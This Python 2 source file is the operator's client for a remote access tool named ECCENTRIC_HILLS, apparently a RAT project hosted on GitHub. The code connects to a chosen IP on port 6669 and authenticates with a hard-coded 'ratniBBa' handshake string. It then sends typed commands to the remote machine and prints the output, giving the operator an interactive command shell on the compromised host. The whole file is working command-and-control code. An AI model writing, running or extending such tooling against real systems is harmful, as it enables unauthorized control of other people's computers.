#ECCENTRIC_HILLS - *NIX Client Deployment Binary
#Written by Gunnar Jones - @gunSec and Austin Crinklaw - @acrinklaw
#https://github.com/acrinklaw/eccentric_hills
import socket
import sys
import os
import time

#Might want to change default port at some point
TIMEOUT = 30
PORT = 6669
CURR_DIRECTORY = os.path.dirname(os.path.realpath(__file__))
with open(CURR_DIRECTORY+"/help.txt", 'r') as inputhandle:
    HELPPROMPT = inputhandle.read()

def listen(connection):
    while True:
        buffer = ""
        while "!!" not in buffer:
            buffer += connection.recv(1024)
        buffer = buffer[:-2]
        print buffer,
        command = raw_input("")
        if command == "quit":
            connection.send("quit\n")
            connection.close()
            break
        else:
            command += "\n"
            connection.send(command)


def main():
    connection = socket.socket()
    print HELPPROMPT
    while True:
        cmd = raw_input("ECHI.localhost> ").lower()

        if cmd == "help":
            print HELPPROMPT

        elif cmd == "connect":
            host = raw_input("Enter server IP address: ")

            try:
                connection.connect((host, PORT))
                connection.send("gunclawpythonratniBBa")
                listen(connection)

            except socket.error:
                print "Failed to connect to host IP."
                userChoice = raw_input("Exit? Y/N\n").lower()
                if userChoice == "y":
                    sys.exit(0)

        elif cmd == "quit":
            try:
                connection.send("quit")

            except:
                print "No connection to close. Terminating program."

            sys.exit(0)

        else:
            print "Command not recognized."


if __name__ == '__main__':
    main()
